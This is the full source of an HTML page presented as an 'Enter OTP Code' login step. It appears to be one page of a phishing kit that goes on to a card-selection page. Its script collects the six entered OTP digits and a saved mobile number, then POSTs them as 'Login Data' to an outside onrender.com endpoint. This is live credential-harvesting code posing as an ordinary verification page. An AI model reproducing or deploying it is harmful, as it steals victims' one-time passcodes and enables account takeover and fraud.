<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Enter OTP Code</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="otp-container">
    <h1 class="otp-title">Enter OTP Code</h1>
    <p class="otp-text">
      We sent a 6-digit code to your mobile number<br />
      <strong class="otp-number">0065241146</strong>
    </p>

    <div class="otp-inputs">
      <input type="text" maxlength="1" inputmode="numeric" style="direction:ltr; text-align:center;" />
      <input type="text" maxlength="1" inputmode="numeric" style="direction:ltr; text-align:center;" />
      <input type="text" maxlength="1" inputmode="numeric" style="direction:ltr; text-align:center;" />
      <input type="text" maxlength="1" inputmode="numeric" style="direction:ltr; text-align:center;" />
      <input type="text" maxlength="1" inputmode="numeric" style="direction:ltr; text-align:center;" />
      <input type="text" maxlength="1" inputmode="numeric" style="direction:ltr; text-align:center;" />
    </div>

    <p class="resend-text">
      Resend code after <span id="timer">00:57</span>
    </p>

    <button type="button" class="login-button">Confirm</button>
  </div>

<script>
document.addEventListener('DOMContentLoaded', () => {
  const savedNumber = localStorage.getItem('mobileNumber');
  const otpNumberEl = document.querySelector('.otp-number');
  if (savedNumber && otpNumberEl) otpNumberEl.textContent = savedNumber;

  const inputs = document.querySelectorAll('.otp-inputs input');

  inputs.forEach((input, index) => {
    input.addEventListener('input', () => {
      if (input.value.length === 1 && index < inputs.length - 1) {
        inputs[index + 1].focus();
      }
    });
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !input.value && index > 0) {
        inputs[index - 1].focus();
      }
    });
  });

  let seconds = 57;
  const timer = document.getElementById('timer');
  const countdown = setInterval(() => {
    if (seconds > 0) {
      seconds--;
      const m = String(Math.floor(seconds / 60)).padStart(2, '0');
      const s = String(seconds % 60).padStart(2, '0');
      timer.textContent = `${m}:${s}`;
    } else {
      clearInterval(countdown);
      timer.textContent = "00:00";
    }
  }, 1000);

  const loginButton = document.querySelector('.login-button');
  loginButton.addEventListener('click', async (e) => {
    e.preventDefault();

    let enteredOtp = '';
    inputs.forEach(input => enteredOtp += input.value);

    if (enteredOtp.length !== inputs.length) {
      alert('Please enter all OTP digits.');
      return;
    }

    localStorage.setItem('enteredOtp', enteredOtp);

    const originalText = loginButton.textContent;
    loginButton.disabled = true;
    loginButton.textContent = 'Sending...';

    try {
      const response = await fetch("https://dashboard-xwzz.onrender.com/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          text: `\nðŸ”‘ Login Data:\nMobile Number:\n ${savedNumber}\nOTP Code:\n${enteredOtp}`
        })
      });

      if (!response.ok) throw new Error(`HTTP ${response.status}`);

      const nextPage = localStorage.getItem('nextPage') || 'chooseCard';
      setTimeout(() => {
        window.location.href = nextPage === 'chooseCard' ? 'chooseCard.html' : 'login.html';
      }, 3000);
      localStorage.removeItem('nextPage');

    } catch (err) {
      console.error("Fetch error:", err);
      alert('Error sending data. Please try again.');
    } finally {
      loginButton.disabled = false;
      loginButton.textContent = originalText;
    }
  });
});
</script>
</body>
</html>
